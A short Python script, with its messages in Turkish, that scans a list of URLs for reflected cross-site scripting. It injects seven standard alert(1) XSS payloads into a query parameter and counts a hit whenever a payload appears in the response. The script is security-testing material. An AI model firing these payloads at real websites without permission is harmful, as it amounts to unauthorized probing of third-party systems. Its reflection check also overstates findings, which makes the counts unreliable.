import requests
import time

def main():
    urls_file = "scanner/urls_xss.txt"
    xss_payloads = [
        "<script>alert(1)</script>",
        "'\"><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<body/onload=alert(1)>",
        "';alert(1);//",
        "<iframe src='javascript:alert(1)'></iframe>"
    ]

    try:
        with open(urls_file, "r") as f:
            urls = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Dosya bulunamadı: {urls_file}")
        return

    if not urls:
        print("[!] URL listesi boş.")
        return

    total_tests = len(urls) * len(xss_payloads)
    found_xss = 0
    timeout_count = 0
    no_vuln_count = 0

    start_time = time.time()

    for url in urls:
        for payload in xss_payloads:
            test_url = url
            if "?" not in url:
                test_url += "?q=" + payload
            else:
                test_url += "&q=" + payload

            headers = {"User-Agent": "Mozilla/5.0"}
            try:
                resp = requests.get(test_url, headers=headers, timeout=5)
                if payload in resp.text:
                    found_xss += 1
                else:
                    no_vuln_count += 1

            except requests.exceptions.Timeout:
                timeout_count += 1
            except Exception:
                no_vuln_count += 1

    end_time = time.time()
    elapsed = end_time - start_time

    print("=" * 50)
    print(f"Toplam denenen URL sayısı: {len(urls)}")
    print(f"Toplam denenen payload sayısı: {len(xss_payloads)}")
    print(f"Toplam test sayısı (URL x Payload): {total_tests}")
    print(f"Toplam geçen süre: {elapsed:.2f} saniye")
    print(f"Bulunan XSS açığı sayısı: {found_xss}")
    print(f"Timeout sayısı: {timeout_count}")
    print(f"Zafiyet bulunmayan test sayısı: {no_vuln_count}")
    print("=" * 50)

